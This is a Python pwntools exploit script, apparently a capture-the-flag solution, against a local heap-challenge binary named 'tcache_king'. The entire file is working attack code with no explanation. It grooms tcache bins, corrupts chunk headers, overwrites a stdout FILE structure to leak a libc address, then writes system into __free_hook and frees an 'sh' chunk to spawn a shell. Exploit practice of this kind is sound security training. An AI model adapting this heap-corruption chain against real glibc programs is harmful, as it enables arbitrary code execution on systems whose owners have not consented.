

from pwn import *
import codecs

p = process('./tcache_king')


def add_note(index, size, contents, raw=False):
	p.sendlineafter("Choice:", '1')
	p.sendlineafter("index:", str(index))
	p.sendlineafter("size:", str(size))
	if(raw):
		p.sendafter("contents:", contents)
	else:
		p.sendlineafter("contents:", contents)

def delete_note(index):
	p.sendlineafter("Choice:", '2')
	p.sendlineafter("index:", str(index))

def change_username(name, raw=False):
	p.sendlineafter("Choice:", '4')
	if(raw):
		p.sendafter("username:", name)
	else:
		p.sendlineafter("username:", name)


p.sendlineafter("username", "Zafir")

add_note(99, 0x210, b"pad\x00\x00\x00\x00\x00" + p64(0)*64 + p64(0x31))
add_note(90, 0x80, "victim 1")
add_note(91, 0x40, "victim 2")
add_note(92, 0x80, "victim 3")

add_note(0, 0x100, "free er")
add_note(1, 0x100, "partial")
add_note(99, 0x250, "pad")
add_note(2, 0x100, b"writer")
add_note(20, 0x40, "name")
add_note(21, 0x40, b"victimmm" + p64(0x41))

for i in range(3, 3+6):
	add_note(i, 0x100, str(i))
delete_note(2)
for i in range(8, 2, -1):
	delete_note(i)
delete_note(1)
delete_note(0)
for i in range(6):
	add_note(99, 0x100, "lol")
delete_note(1)

add_note(80, 0x120, p64(0x41) + p64(0)*33 + b'\x70', raw=True)

add_note(99, 0x100, "lol")

change_username("Zafir")
delete_note(91)
delete_note(21)
add_note(42, 0x100, p64(0x41424344) + p64(0)*18 + b"\x51\x00\x00\x00\x00\x00\x00\x00" + p64(0)*9 + b"\x51\x00\x00\x00\x00\x00\x00\x00")
add_note(15, 0x40, b"15")
change_username(p64(0) + p64(0xe1))




add_note(0, 0x100, "free er")
add_note(1, 0x100, "partial")
add_note(99, 0x2c0, "pad")
add_note(2, 0x100, b"writer")
add_note(20, 0x40, "name")
add_note(21, 0x40, "victim")
add_note(20, 0x40, "name")
add_note(21, 0x40, "victim")

for i in range(3, 3+6):
	add_note(i, 0x100, str(i))	
delete_note(2)
for i in range(8, 2, -1):
	delete_note(i)
delete_note(1)
delete_note(0)
for i in range(6):
	add_note(99, 0x100, "lol")
delete_note(1)

add_note(80, 0x120, p64(0x41) + p64(0)*33 + b'\x70', raw=True)

add_note(99, 0xe0, "lol")
add_note(99, 0x100, "lol")

delete_note(20)

for i in range(50, 57):
	add_note(i, 0xd0, str(i))
for i in range(50, 57):
	delete_note(i)

delete_note(90)

add_note(99, 0x20, "ASDF")

change_username("Zafir")
delete_note(91)
delete_note(21)
add_note(42, 0x100, p64(0x41424344) + p64(0)*18 + b"\x51\x00\x00\x00\x00\x00\x00\x00" + p64(0)*9 + b"\x51\x00\x00\x00\x00\x00\x00\x00" + b"\x70", raw=True)
add_note(15, 0x40, b"15")
add_note(42, 0x40, b"15")

delete_note(15)
delete_note(91)
add_note(71, 0x50, b"looooool"*4 + p64(0) + p64(0x51))
delete_note(42)
change_username(p64(0)*5 + p64(0x51) + b'\x90\x96', raw=True)

add_note(99, 0x40, "lol")
change_username(p64(0x0)*2 + p64(0xfbad3c80) + p64(0x0)*3 + b'\x00', raw=True)

libc_leak = int(codecs.encode(p.recvuntil('\x7f', timeout=3)[-6:][::-1], 'hex'), 16)
print(hex(libc_leak))
libc_base = libc_leak - 0x1eb980
free_hook = libc_base + 0x1eeb28
system = libc_base + 0x55410

delete_note(15)
delete_note(91)
delete_note(42)
change_username(p64(0)*5 + p64(0x51) + p64(free_hook))
add_note(0, 0x40, "sh")
change_username(p64(system))
delete_note(91)



p.interactive()
p.close()